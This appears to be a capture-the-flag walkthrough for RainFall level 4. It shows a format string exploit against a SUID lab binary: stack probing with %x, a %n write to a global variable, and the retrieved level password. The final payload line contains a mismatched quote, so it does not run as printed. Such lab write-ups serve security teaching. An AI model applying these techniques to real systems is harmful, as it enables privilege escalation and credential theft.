# Level 4 Walkthrough

## Who am I?

```bash
level4@RainFall:~$ id
uid=2025(level4) gid=2025(level4) groups=2025(level4),100(users)
```

## Where am I?

```bash
level4@RainFall:~$ ll
total 17
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4*
```

We are in possession of a SUID binary owned by `level5`. Our objective is to exploit this binary to execute a command as `level5` and retrieve the contents of the `.pass` file.

---

## Program Behavior

Running the binary:

```bash
level4@RainFall:~$ ./level4
hello
hello
```

No crash, even when injecting long strings:

```bash
level4@RainFall:~$ python -c "print('A'*200)" | ./level4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

This suggests the program uses `fgets()`, which safely limits input size.

---

## Decompiled Structure (via Ghidra)

```c
// main.c
void main(void) {
    n();
    return;
}

// n.c
void n(void) {
    char buffer[520];
    fgets(buffer, 0x200, stdin);
    p(buffer);
    if (m == 0x1025544) {
        system("/bin/cat /home/user/level5/.pass");
    }
    return;
}

// p.c
void p(char *param) {
    printf(param);
    return;
}
```

The structure is very similar to level3. The main difference is that `printf()` is now called via an intermediate function `p(char *)` instead of directly in the main function.

---

## Format String Vulnerability

Because `printf(param)` is called with user-controlled input and without a format string, it introduces a **format string vulnerability**.

We can attempt to inspect the stack layout with:

```bash
python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x"' | ./level4
AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0
```

No sign of `0x41414141` (`AAAA`) appears, so we continue probing:

```bash
python -c 'print "AAAA" + " %x" * 15' | ./level4
AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```

We find `0x41414141` ("AAAA") at the **12th** stack position. This is exactly the same approach used in level3, where the injected marker allowed us to find the correct offset to use in our `%n` format string attack.

---

## Exploitation Strategy

### Step 1: Find offset on the stack

We inject 10 %x to see where our input lands:

```bash
python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x"' | ./level4
```

No sign of `41414141` yet. We continue:

```bash
python -c 'print "AAAA" + " %x" * 15' | ./level4
```

We observe `41414141` (AAAA) at the **12th** position on the stack. Therefore, we will use `%12$n` to write to the address placed as the 12th argument.

### Step 2: Inject address of m on the stack

From disassembly, we see:

```asm
0x0804848d <+54>:    mov    0x8049810,%eax
0x08048492 <+59>:    cmp    $0x1025544,%eax
```

We confirm that the value compared is stored at memory address `0x08049810`, and the target value is `0x1025544` (16930116 in decimal).

We now test placing this address directly in our input to observe its position:

```bash
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08 %x %x %x %x %x %x %x %x %x %x %x %x"' | ./lev
el4
 b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 8049810
```

We observe that `0x08049810` appears at the **12th** position on the stack. As in level3, we must format our payload accordingly, using `%12$n` to target the correct argument.

### Step 3: Craft final payload

To exploit the vulnerability, we needed to:

* Identify the address to overwrite: `0x08049810`, found from disassembly.
* Determine the value to write: `0x1025544` (16930116 in decimal) to satisfy the condition: `if (m == 0x1025544)`.
* Discover that our input appears at the 12th position on the stack, using `%x` probes.
* Confirm that the user input is passed to `printf()` without format validation.

To write the desired value using `%n`, we must ensure that exactly `16930116` characters are printed before reaching `%12$n`. This is accomplished using `%16930112d`, as the first 4 bytes (the address) are already printed.

To understand `%n`, recall this example:

```c
int written = 0;
printf("Hello world!%n", &written);
```

After executing, `written == 12` because 12 characters were printed.

### Step 4: Build and launch the payload

```bash
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08 + "%16930112d" + "%12$n"' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
            -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

As seen above, the program directly outputs the contents of the `.pass` file. This is because, upon successful comparison, the function `n()` executes the following instruction:

```c
system("/bin/cat /home/user/level5/.pass");
```

There is no need to maintain input open as in level3, the command is self-contained and prints the result immediately.

Now use the retrieved flag to switch to the next user:

```bash
level4@RainFall:~$ su level5
Password:
```

Once logged in, we confirm access:

```bash
level5@RainFall:~$ id
uid=2026(level5) gid=2026(level5) groups=2026(level5)
```

Success.

---

## Files in this repository

* `flag.txt`: file containing the retrieved flag
* `asm_analysis.md`: GDB analysis of the binary
* `source/`: contains `ghidra/` (raw Ghidra decompilation) and `clean/` (cleaned C, faithful to binary)